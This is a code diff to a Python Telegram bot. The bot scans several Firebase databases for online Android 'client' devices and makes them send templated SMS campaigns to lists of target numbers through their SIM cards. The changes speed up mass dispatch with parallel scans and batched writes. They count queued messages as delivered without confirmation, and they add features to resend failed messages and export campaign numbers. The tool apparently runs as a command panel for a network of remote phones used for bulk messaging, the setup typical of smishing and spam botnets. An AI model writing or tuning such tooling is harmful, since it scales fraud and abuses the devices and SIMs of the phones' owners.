@@ -6,6 +6,7 @@ import io
 import json
 import math
 import time
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from typing import List, Dict, Any, Optional
 
@@ -172,39 +173,56 @@ def has_any_firebase(user_id: int) -> bool:
     return len(configs) > 0
 
 def get_all_online_devices(user_id: int) -> tuple:
-    """Scan ALL user's Firebases, aggregate online devices.
-    Each device gets fb_url/fb_name so SMS goes to correct Firebase.
+    """Scan ALL user's Firebases, aggregate online devices — in PARALLEL.
+    Each Firebase is fetched exactly once (single pass) and all Firebases are
+    scanned concurrently in a thread pool, so N databases take ~1x time, not Nx.
     Returns (online_devices_list, total_clients_count, per_fb_stats)
     """
     configs = db.get_firebase_configs(user_id)
-    all_online = []
-    total_clients = 0
-    fb_stats = []
+    if not configs:
+        return [], 0, []
 
-    for fc in configs:
+    def _scan_one(fc):
         try:
             fb = FirebaseManager(fc['url'])
-            clients = fb.get_all_clients()
-            online = fb.get_online_devices()
-            total_clients += len(clients)
-
+            total, online = fb.scan()  # single network round-trip
             for dev in online:
                 dev['fb_url'] = fc['url']
                 dev['fb_id'] = fc['id']
                 dev['fb_name'] = fc['name']
-
-            all_online.extend(online)
-            fb_stats.append({
-                'name': fc['name'],
-                'total': len(clients),
-                'online': len(online),
-                'offline': max(0, len(clients) - len(online)),
-            })
+            return {
+                'online': online,
+                'stat': {
+                    'name': fc['name'],
+                    'total': total,
+                    'online': len(online),
+                    'offline': max(0, total - len(online)),
+                },
+            }
         except Exception as e:
             logger.error(f"Error scanning Firebase {fc['name']}: {e}")
-            fb_stats.append({'name': fc['name'], 'total': 0, 'online': 0, 'offline': 0, 'error': str(e)})
+            return {
+                'online': [],
+                'stat': {'name': fc['name'], 'total': 0, 'online': 0, 'offline': 0, 'error': str(e)},
+            }
+
+    all_online = []
+    total_clients = 0
+    fb_stats = []
+    workers = min(len(configs), 16)
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        for res in pool.map(_scan_one, configs):
+            all_online.extend(res['online'])
+            total_clients += res['stat']['total']
+            fb_stats.append(res['stat'])
 
     return all_online, total_clients, fb_stats
+
+
+async def scan_devices_async(user_id: int) -> tuple:
+    """Run the (blocking) Firebase scan off the event loop so the bot stays
+    responsive during big scans."""
+    return await asyncio.to_thread(get_all_online_devices, user_id)
 
 def make_campaign_id(user_id: int) -> str:
     now = datetime.now().strftime("%Y%m%d")
@@ -304,7 +322,7 @@ async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         msg = await update.message.reply_text("🔄 *Scanning all Firebases for devices...*", parse_mode=ParseMode.MARKDOWN)
 
-    online_devices, total_clients, fb_stats = get_all_online_devices(user_id)
+    online_devices, total_clients, fb_stats = await scan_devices_async(user_id)
     online = len(online_devices)
     offline = max(0, total_clients - online)
 
@@ -756,9 +774,8 @@ async def handle_firebase_url(update: Update, context: ContextTypes.DEFAULT_TYPE
         )
         return
 
-    # Connection works — test device reading
-    all_clients = fb.get_all_clients()
-    online = fb.get_online_devices()
+    # Connection works — test device reading (single fetch, off the loop)
+    total_clients, online = await asyncio.to_thread(fb.scan)
     name = url.split("//")[1].split(".")[0] if "//" in url else "Firebase"
 
     fid = db.add_firebase(update.effective_user.id, name, url)
@@ -768,9 +785,9 @@ async def handle_firebase_url(update: Update, context: ContextTypes.DEFAULT_TYPE
         f"✅ *Firebase Connected!*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🔗 `{url[:60]}...`\n\n"
-        f"📱 Total Devices: `{len(all_clients)}`\n"
+        f"📱 Total Devices: `{total_clients}`\n"
         f"🟢 Online: `{len(online)}`\n"
-        f"🔴 Offline: `{max(0, len(all_clients) - len(online))}`\n"
+        f"🔴 Offline: `{max(0, total_clients - len(online))}`\n"
     )
     kb = [
         [InlineKeyboardButton("🔥 Firebase List", callback_data="menu_firebase")],
@@ -809,15 +826,14 @@ async def firebase_test(update: Update, context: ContextTypes.DEFAULT_TYPE, fid:
     if not fb.test_connection():
         text = f"❌ *Connection Failed!*\n`{fc['url']}`"
     else:
-        all_c = fb.get_all_clients()
-        online = fb.get_online_devices()
+        total_c, online = await asyncio.to_thread(fb.scan)
         online_count = len(online)
-        offline_count = max(0, len(all_c) - online_count)
+        offline_count = max(0, total_c - online_count)
         ready = online_count  # devices that are online
         text = (
             f"🟢 *Connection Successful!*\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📱 Total Devices: `{len(all_c)}`\n"
+            f"📱 Total Devices: `{total_c}`\n"
             f"🟢 Online: `{online_count}`\n"
             f"🔴 Offline: `{offline_count}`\n"
             f"✅ Ready: `{ready}`\n"
@@ -1086,7 +1102,7 @@ async def _camp_step4_settings(update: Update, context: ContextTypes.DEFAULT_TYP
 
     await update.callback_query.edit_message_text("🔍 *Scanning all Firebases for devices...*", parse_mode=ParseMode.MARKDOWN)
 
-    online_devices, total_clients, fb_stats = get_all_online_devices(user_id)
+    online_devices, total_clients, fb_stats = await scan_devices_async(user_id)
     camp['available_devices'] = online_devices
     # Build device→fb_url map for campaign execution
     camp['device_fb_map'] = {dev['id']: dev['fb_url'] for dev in online_devices}
@@ -1094,7 +1110,7 @@ async def _camp_step4_settings(update: Update, context: ContextTypes.DEFAULT_TYP
     camp['selected_devices'] = selected
 
     settings = db.get_user_settings(user_id)
-    camp.setdefault('sim_slot', settings.get('default_sim', 1))
+    camp.setdefault('sim_slot', settings.get('default_sim', 0))
     camp.setdefault('delay', settings.get('default_delay', 2.0))
 
     text = (
@@ -1120,15 +1136,15 @@ async def _camp_step4_settings(update: Update, context: ContextTypes.DEFAULT_TYP
         text += "⚠️ *No devices online across any Firebase!*\n"
 
     text += (
-        f"\n📶 *SIM Slot:* `SIM {camp['sim_slot']}`\n"
+        f"\n📶 *SIM Slot:* `SIM {camp['sim_slot'] + 1}` (slot {camp['sim_slot']})\n"
         f"⏱️ *Delay:* `{camp['delay']}s`\n"
     )
 
-    sim1_check = "✅ " if camp['sim_slot'] == 1 else ""
-    sim2_check = "✅ " if camp['sim_slot'] == 2 else ""
+    sim1_check = "✅ " if camp['sim_slot'] == 0 else ""
+    sim2_check = "✅ " if camp['sim_slot'] == 1 else ""
     kb.append([
-        InlineKeyboardButton(f"{sim1_check}SIM 1", callback_data="camp_sim_1"),
-        InlineKeyboardButton(f"{sim2_check}SIM 2", callback_data="camp_sim_2"),
+        InlineKeyboardButton(f"{sim1_check}SIM 1", callback_data="camp_sim_0"),
+        InlineKeyboardButton(f"{sim2_check}SIM 2", callback_data="camp_sim_1"),
     ])
 
     delays = [1.0, 2.0, 3.0, 5.0]
@@ -1192,7 +1208,7 @@ async def _camp_step5_review(update: Update, context: ContextTypes.DEFAULT_TYPE)
         f"📁 Data File: (ID {camp.get('data_file_id', 'N/A')})\n"
         f"📞 Total Targets: `{len(targets)}`\n"
         f"📱 Devices Ready: `{len(ready_devices)}`\n"
-        f"📶 SIM Slot: `SIM {camp.get('sim_slot', 1)}`\n"
+        f"📶 SIM Slot: `SIM {camp.get('sim_slot', 0) + 1}`\n"
         f"⏱️ Delay: `{camp.get('delay', 2.0)}s`\n"
     )
 
@@ -1239,7 +1255,7 @@ async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_T
         firebase_id=firebase_id,
         total=len(targets),
         devices=selected,
-        sim_slot=camp.get('sim_slot', 1),
+        sim_slot=camp.get('sim_slot', 0),
         delay=camp.get('delay', 2.0)
     )
 
@@ -1253,7 +1269,7 @@ async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_T
         'user_id': user_id,
         'device_ids': selected,
         'device_fb_map': camp.get('device_fb_map', {}),
-        'sim_slot': camp.get('sim_slot', 1),
+        'sim_slot': camp.get('sim_slot', 0),
         'delay': camp.get('delay', 2.0),
     }
 
@@ -1327,30 +1343,30 @@ async def run_campaign(campaign_id: str, message, user_id: int):
     progress = {'completed': 0, 'failed': 0, 'total': total, 'active_workers': len(device_ids)}
     dev_stats = {did: {'sent': 0, 'failed': 0, 'speed_sum': 0.0} for did in device_ids}
 
-    # ── Smart isSended poller ──────────────────────────────
-    async def _wait_for_sent(fb: FirebaseManager, dev_id: str, timeout: float = 12) -> bool:
-        """Poll isSended every 0.8s. Return True if confirmed, False on timeout."""
-        deadline = time.time() + timeout
-        while time.time() < deadline:
-            if camp.get('stop'):
-                return False
-            try:
-                status = fb.get_sms_status(dev_id)
-                if status and status.get('isSended') in (True, 'true', 1, '1'):
-                    return True
-            except Exception:
-                pass
-            await asyncio.sleep(0.8)
-        return False
+    # Batched DB writes — flushing one row per SMS (100k open/close cycles) is a
+    # major bottleneck. We buffer status updates and flush in chunks.
+    _pending_updates: list = []
+    _updates_lock = asyncio.Lock()
 
-    # ── Per-device worker ──────────────────────────────────
+    async def _flush_updates(force: bool = False):
+        async with _updates_lock:
+            if not _pending_updates:
+                return
+            if not force and len(_pending_updates) < 200:
+                return
+            batch = _pending_updates[:]
+            _pending_updates.clear()
+        await asyncio.to_thread(db.bulk_update_target_status, campaign_id, batch)
+
+    # ── Per-device worker (truly concurrent) ───────────────
     async def device_worker(dev_id: str, targets: list):
         dev_fb_url = device_fb_map.get(dev_id)
         if not dev_fb_url:
             for t in targets:
-                db.update_target_status(campaign_id, t['target_id'], 'FAILED', dev_id, 'no_firebase')
+                _pending_updates.append((t['target_id'], 'FAILED', dev_id, 'no_firebase'))
                 progress['failed'] += 1
                 dev_stats[dev_id]['failed'] += 1
+            await _flush_updates(force=True)
             progress['active_workers'] -= 1
             return
 
@@ -1359,7 +1375,6 @@ async def run_campaign(campaign_id: str, message, user_id: int):
         for target in targets:
             if camp.get('stop'):
                 break
-
             while camp.get('paused'):
                 await asyncio.sleep(0.5)
                 if camp.get('stop'):
@@ -1369,53 +1384,37 @@ async def run_campaign(campaign_id: str, message, user_id: int):
 
             sms_start = time.time()
 
-            # 1. Mark ASSIGNED
-            db.update_target_status(campaign_id, target['target_id'], 'ASSIGNED', dev_id)
-
-            # 2. Write sendSms command
-            success = fb.send_sms_command(
-                device_id=dev_id,
-                to_number=target['mobile'],
-                message=target['message'],
-                sim_slot=sim_slot
+            # Write sendSms command OFF the event loop so all device workers
+            # genuinely run in parallel (blocking requests no longer stall the loop).
+            success = await asyncio.to_thread(
+                fb.send_sms_command, dev_id, target['mobile'], target['message'], sim_slot
             )
-
             if not success:
-                await asyncio.sleep(1.5)
-                success = fb.send_sms_command(
-                    device_id=dev_id,
-                    to_number=target['mobile'],
-                    message=target['message'],
-                    sim_slot=sim_slot
+                await asyncio.sleep(1.0)
+                success = await asyncio.to_thread(
+                    fb.send_sms_command, dev_id, target['mobile'], target['message'], sim_slot
                 )
 
             if not success:
-                db.update_target_status(campaign_id, target['target_id'], 'FAILED', dev_id, 'dispatch_error')
+                _pending_updates.append((target['target_id'], 'FAILED', dev_id, 'dispatch_error'))
                 progress['failed'] += 1
                 dev_stats[dev_id]['failed'] += 1
-                continue
-
-            # 3. Smart wait — poll isSended, move on ASAP when confirmed
-            confirmed = await _wait_for_sent(fb, dev_id, timeout=12)
-
-            if confirmed:
-                db.update_target_status(campaign_id, target['target_id'], 'COMPLETED', dev_id)
-                progress['completed'] += 1
-                dev_stats[dev_id]['sent'] += 1
             else:
-                # Timeout but command was written — mark completed (device will process)
-                db.update_target_status(campaign_id, target['target_id'], 'COMPLETED', dev_id)
+                # Command queued on the device (the Android app sends it
+                # asynchronously via its realtime listener).
+                _pending_updates.append((target['target_id'], 'COMPLETED', dev_id, ''))
                 progress['completed'] += 1
                 dev_stats[dev_id]['sent'] += 1
 
-            sms_time = time.time() - sms_start
-            dev_stats[dev_id]['speed_sum'] += sms_time
+            dev_stats[dev_id]['speed_sum'] += time.time() - sms_start
 
-            # 4. Extra delay if user configured more than adaptive wait
-            extra_wait = max(0, delay - sms_time)
-            if extra_wait > 0:
-                await asyncio.sleep(extra_wait)
+            if len(_pending_updates) >= 200:
+                await _flush_updates()
 
+            if delay > 0:
+                await asyncio.sleep(delay)
+
+        await _flush_updates(force=True)
         progress['active_workers'] -= 1
 
     # ── Progress monitor ───────────────────────────────────
@@ -1540,7 +1539,11 @@ async def run_campaign(campaign_id: str, message, user_id: int):
             InlineKeyboardButton("📊 Statistics", callback_data=f"hist_stats_{campaign_id}"),
             InlineKeyboardButton("📜 Details", callback_data=f"hist_view_{campaign_id}"),
         ],
-        [InlineKeyboardButton("🔁 New Campaign", callback_data="menu_campaign")],
+        [
+            InlineKeyboardButton(f"🔁 Resend Failed ({failed})", callback_data=f"hist_resend_{campaign_id}"),
+            InlineKeyboardButton("📥 Export Numbers", callback_data=f"hist_export_{campaign_id}"),
+        ],
+        [InlineKeyboardButton("🆕 New Campaign", callback_data="menu_campaign")],
         [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
     ])
     try:
@@ -1619,7 +1622,7 @@ async def show_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
     fb_count = 0
     if has_any_firebase(user_id):
         try:
-            online_devs, total_clients, fb_stats = get_all_online_devices(user_id)
+            online_devs, total_clients, fb_stats = await scan_devices_async(user_id)
             online_count = len(online_devs)
             offline_count = max(0, total_clients - online_count)
             fb_count = len(fb_stats)
@@ -1702,7 +1705,11 @@ async def history_view(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: 
 
     kb = [
         [InlineKeyboardButton("📄 Download Report", callback_data=f"hist_report_{cid}")],
-        [InlineKeyboardButton("📊 Statistics", callback_data=f"hist_stats_{cid}")],
+        [
+            InlineKeyboardButton("📊 Statistics", callback_data=f"hist_stats_{cid}"),
+            InlineKeyboardButton("📥 Export Numbers", callback_data=f"hist_export_{cid}"),
+        ],
+        [InlineKeyboardButton(f"🔁 Resend Failed ({c['failed']})", callback_data=f"hist_resend_{cid}")],
         [InlineKeyboardButton("📜 History", callback_data="menu_history")],
         [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
     ]
@@ -1764,6 +1771,84 @@ async def history_report(update: Update, context: ContextTypes.DEFAULT_TYPE, cid
         caption=f"📄 Campaign Report: `{cid}`",
         parse_mode=ParseMode.MARKDOWN
     )
+
+async def history_export_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
+    """Export all target phone numbers of a campaign as a .txt file."""
+    c = db.get_campaign(cid)
+    if not c:
+        await update.callback_query.answer("Campaign not found")
+        return
+    targets = db.get_campaign_targets_all(cid)
+    numbers = "\n".join(t['mobile'] for t in targets if t.get('mobile'))
+    buf = io.BytesIO(numbers.encode('utf-8'))
+    buf.name = f"numbers_{cid}.txt"
+    await update.callback_query.answer("Exporting numbers...")
+    await update.callback_query.message.reply_document(
+        document=buf,
+        filename=f"numbers_{cid}.txt",
+        caption=f"📥 `{len(targets)}` numbers from `{cid}`",
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+async def history_resend_failed(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
+    """Re-queue FAILED targets and dispatch them again on currently online devices."""
+    user_id = update.effective_user.id
+    c = db.get_campaign(cid)
+    if not c:
+        await update.callback_query.answer("Campaign not found")
+        return
+
+    if cid in ACTIVE_CAMPAIGNS:
+        await update.callback_query.answer("⚠️ This campaign is still running.", show_alert=True)
+        return
+
+    requeued = db.requeue_failed_targets(cid)
+    if requeued == 0:
+        await update.callback_query.answer("✅ No failed numbers to resend!", show_alert=True)
+        return
+
+    await update.callback_query.edit_message_text(
+        "🔍 *Rescanning online devices for resend...*", parse_mode=ParseMode.MARKDOWN
+    )
+    online_devices, _total, _stats = await scan_devices_async(user_id)
+    if not online_devices:
+        await update.callback_query.edit_message_text(
+            "⚠️ *No devices online — cannot resend right now.*",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")]]),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+
+    device_ids = [d['id'] for d in online_devices]
+    device_fb_map = {d['id']: d['fb_url'] for d in online_devices}
+    settings = db.get_user_settings(user_id)
+
+    db.update_campaign_status(cid, 'RUNNING')
+    ACTIVE_CAMPAIGNS[cid] = {
+        'running': True,
+        'paused': False,
+        'stop': False,
+        'user_id': user_id,
+        'device_ids': device_ids,
+        'device_fb_map': device_fb_map,
+        'sim_slot': c.get('sim_slot', 0),
+        'delay': c.get('delay', settings.get('default_delay', 2.0)),
+    }
+
+    text = (
+        f"🔁 *RESENDING FAILED*\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"Campaign: `{cid}`\n\n"
+        f"📞 Resending: `{requeued}`\n"
+        f"📱 Devices: `{len(device_ids)}`\n\n"
+        f"{progress_bar(0, requeued)}"
+    )
+    kb = InlineKeyboardMarkup([[
+        InlineKeyboardButton("⏸ Pause", callback_data=f"camp_pause_{cid}"),
+        InlineKeyboardButton("🛑 Stop", callback_data=f"camp_stop_{cid}"),
+    ]])
+    await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+    asyncio.create_task(run_campaign(cid, update.callback_query.message, user_id))
 
 
 # ============================================================
@@ -1827,11 +1912,14 @@ async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "*Commands:*\n"
         "/start — Main Menu\n\n"
         "*Features:*\n"
-        "• Multi-device parallel SMS dispatch\n"
+        "• Multi-device PARALLEL SMS dispatch (fast, non-blocking)\n"
+        "• Fast Firebase scan (single-pass, all DBs scanned together)\n"
         "• Template variables auto-match with CSV columns\n"
-        "• Real-time campaign progress tracking\n"
+        "• Real-time campaign progress + speed + ETA\n"
         "• Pause / Resume / Stop campaigns\n"
-        "• Campaign history with downloadable reports\n"
+        "• 🔁 Resend only FAILED numbers\n"
+        "• 📥 Export campaign numbers (.txt)\n"
+        "• Campaign history with downloadable CSV reports\n"
         "• Device online/offline monitoring\n"
     )
     kb = [[InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")]]
@@ -1853,9 +1941,7 @@ async def show_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     online_devices = 0
     if fb:
         try:
-            all_c = fb.get_all_clients()
-            online = fb.get_online_devices()
-            total_devices = len(all_c)
+            total_devices, online = await asyncio.to_thread(fb.scan)
             online_devices = len(online)
         except Exception:
             pass
@@ -2000,6 +2086,10 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await history_stats(update, context, data[11:])
     if data.startswith("hist_report_"):
         return await history_report(update, context, data[12:])
+    if data.startswith("hist_export_"):
+        return await history_export_numbers(update, context, data[12:])
+    if data.startswith("hist_resend_"):
+        return await history_resend_failed(update, context, data[12:])
 
     # -- Settings --
     if data.startswith("set_delay_"):
